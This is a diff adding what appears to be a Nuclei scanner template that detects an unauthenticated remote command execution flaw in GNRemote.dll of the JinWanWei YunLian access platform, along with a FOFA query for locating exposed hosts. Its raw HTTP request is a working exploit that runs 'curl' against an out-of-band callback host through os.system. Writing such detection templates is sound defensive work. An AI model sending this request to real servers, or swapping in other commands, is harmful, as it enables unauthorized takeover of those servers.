@@ -1,0 +1,28 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  raw:
+  - 'GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=curl+{{interactsh-url}}
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: gnway-gnremote-rce
+info:
+  author: Co5mos
+  description: 'JinWanWei YunLian Application System Access Platform''s `GNRemote.dll`
+    interface has a remote command execution vulnerability that allows unauthenticated
+    remote attackers to execute arbitrary code on the server, potentially gaining
+    full control over the web server.
+
+    '
+  metadata:
+    fofa-query: "title=\"\u4E91\u8054\u5E94\u7528\u7CFB\u7EDF\u63A5\u5165\u5E73\u53F0\
+      \""
+  name: JinWanWei YunLian Application System Access Platform GNRemote.dll RCE
+  severity: critical
+  tags: gnway, rce
